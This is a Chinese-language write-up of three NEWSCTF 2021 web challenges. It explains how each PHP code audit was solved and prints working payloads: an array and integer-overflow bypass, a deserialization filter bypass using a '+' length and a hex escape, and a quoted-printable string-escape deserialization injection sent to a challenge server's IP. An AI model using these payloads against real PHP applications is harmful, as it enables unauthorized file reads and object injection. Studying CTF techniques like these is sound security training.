# NEWSCTF 2021 Web



## easy_web

我好烦怎么还带misc。。。。出题人给我爬。。。

简单的代码审计，就不细说了。最后的数组那个，蓝帽刚考过：

https://blog.csdn.net/qq_45951598/article/details/110677273?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-6-110677273.pc_agg_rank_aggregation&utm_term=php+%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA&spm=1000.2123.3001.4430

payload：

```
webp=123456&a[]=1&b[]=2&c=9223372036854775806
```

得到了密码。提示图片，把图片下载下来，binwalk看一下发现还有个压缩包，提取出来：

```shell
feng@feng:~/桌面$ binwalk backImg.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1054 x 745, 8-bit/color RGBA, non-interlaced
1522188       0x173A0C        Zip archive data, encrypted at least v2.0 to extract, compressed size: 43, uncompressed size: 36, name: trueflag.txt
1522367       0x173ABF        End of Zip archive, footer length: 22

feng@feng:~/桌面$ foremost backImg.jpg 
Processing: backImg.jpg
|foundat=trueflag.txtOYҖ���y�G�ë꭮a04]�Hg��@�E\t��:O��,PK
*|
feng@feng:~/桌面$ 
```

然后拿得到的压缩密码解压，打开文件即可得到flag：

```
newsctf{this_1s_veryveryveryeasyweb}
```



## weblog

考察的是反序列化，这题我卡了有一段时间，主要是我一直在拿本地打，我本地是php7.3.4，题目环境是5.5.21，所以题目能打通但是我本地一直打不通就一直有些想偏了。

反序列化的构造思路还是比较简单的，就是读`flag.php`：

```php
<?php
class A {
    public $weblogfile="flag.php";
    function __wakeup(){
        $obj = new B($this->weblogfile);
    }
}
echo serialize(new A());
```

然后就是想办法绕过对于flag的过滤。他这里写了一个`is_serialized`函数，我觉得主要的还是这里：

```php
    $r = preg_match_all('/:\d*?:"/',$data,$m,PREG_OFFSET_CAPTURE);
    if(!empty($r)) {
        foreach($m[0] as $v){
            $a = intval($v[1])+strlen($v[0])+intval(substr($v[0],1));
            if($data[$a] !== '"')
                return false;
        }
    }
```

取类似`:1:"`的，然后对于这个长度看是不是`"`。比如我们这里的

`O:1:"A":1:{s:10:"weblogfile";s:8:"flag.php";}`

正则匹配到`:8:"`，然后判断8个字符之后的是不是双引号，也就是说对于这个长度要正确。

因此很容易想到加正号来绕过正则，加了然后就是flag的过滤了：

```php
$log = str_replace('flag','',$log);
```

16进制绕过即可。最终payload：

```php
?log=O:1:"A":1:{s:10:"weblogfile";S:%2b8:"\66lag.php";}
```



## weblogin

同样是反序列化的代码审计，主要问题在于`convert.quoted-printable-decode`，正好前天昨天都在看laravel的那个rce，对这个过滤器很熟。出题人写的`enc`函数：

```php
function enc($str){
    $_str = '';
    for($i=0;$i<strlen($str);$i++){
        if ($str[$i] !== '='){
            $_str = $_str.'='.dechex(ord($str[$i]));
        }else{
            $_str = $_str.$str[$i].$str[$i+1].$str[$i+2];
            $i = $i+2;
        }
    }
    return $_str;
}
```

会在这样的地方进行enc：

```php
file_put_contents($file, enc(serialize($p)));
```

看一下这个`enc`函数就会发现，它不是取每一位进行`quoted-printable-encode`，如果遇到了本来就有等于号的，不会把这一位进行加密，而是直接保留这个等于号和他的接下来两个字母。也就是说，对于本来的已经被`quoted-printable-encode`的，就不会再处理。

这里就存在了一个问题，也就是说写入的内容是我们可控的（确实是这样）。然后代码中有这样的操作：

```php
$p = unserialize(filter(file_get_contents('php://filter/read=convert.quoted-printable-decode/resource='.$file)));
```

取出里面的然后再反序列化得到对象。这个反序列化的对象能不能控制呢？比如它就是`Action`类的一个对象，如果它的`$datafile`可控，就可以考虑得到`$flaag = 'flag'.md5($_SERVER['REMOTE_ADDR']).'data'`了。



至于为什么说对象可控，把整个代码的逻辑和上述的思路想一下就会感觉到，比如我用的是register功能，传入的username本身就包含类似`=31`这样的字符，序列化得到的那个字符串，里面的长度算的肯定是`=31`的长度，但是经过`$p = unserialize(filter(file_get_contents('php://filter/read=convert.quoted-printable-decode/resource='.$file)));`反序列化处理得到的对象，就会出现问题，因为这里处理得到的会把`=31`进行解密得到字母`1`。

举个例子，比如`username`传的是`=31`，这样序列化得到的这部分就是：

```php
s:3:"=31"
```

然后进行写入：

```php
file_put_contents($file,enc(serialize($p)));
```

写入的是

```php
=3a=33=3a=22=31=22
```

因为`enc`函数的问题，并没有对`=31`再挨个加密，而是保留了。之后再加密，反序列化，得到的会是这样：

```php
s:3:"1"
```

存在一个反序列化字符串逃逸的问题。因此想办法利用`enc`函数的问题，来反序列化字符串逃逸即可。

正常的`register`，得到的对象是这样：

```php
O:6:"Action":5:{s:4:"data";a:1:{i:12131;s:1:"1";}s:8:"username";s:0:"";s:8:"password";s:0:"";s:8:"datafile";s:0:"";s:3:"act";s:0:"";}
```



随便试试字符串逃逸：

```php
post:username==31=31=31&password==31=31=31

o:6:"Action":5:{s:4:"data";a:2:{i:12131;s:1:"1";s:9:"111";s:9:"111";}s:8:"username";s:0:"";s:8:"password";s:0:"";s:8:"datafile";s:0:"";s:3:"act";s:0:"";}
```

可以发现后面就会有数量上的问题：

```php
s:9:"111";s:9:"111";}s:8:"username";s:0:"";s:8:"password";s:0:"";s:8:"datafile";s:0:"";s:3:"act";s:0:"";}
```

可以想办法进行字符串的逃逸，进行闭合来实现反序列化得到的对象的控制。

直接给出我的payload了，因此思路知道了，接下来的字符逃逸就很简单了：

```php
http://103.45.131.26:22221/index.php/register

username==31=31=31=31=31&password==31=22=3b=73=3a=30=3a=22=22=3b=7d=73=3a=38=3a=22=64=61=74=61=66=69=6c=65=22=3b=73=3a=33=36=3a=22=66=6c=61=67=63=63=38=64=61=65=35=34=37=64=30=37=66=61=64=34=39=35=66=37=37=63=64=63=66=64=33=39=64=63=34=38=22=3b=73=3a=33=3a=22=61=63=74=22=3b=73=3a=38=3a=22=72=65=67=69=73=74=65=72=22=3b=73=3a=38=3a=22=75=73=65=72=6e=61=6d=65=22=3b=73=3a=30=3a=22=22=3b=73=3a=38=3a=22=70=61=73=73=77=6f=72=64=22=3b=73=3a=30=3a=22=22=3b=7d
```

然后再访问一次`/register`即可，再访问`/flag`得到flag：

```
flag{hahaha_newsctfunserialize_is_so_esay!}
```









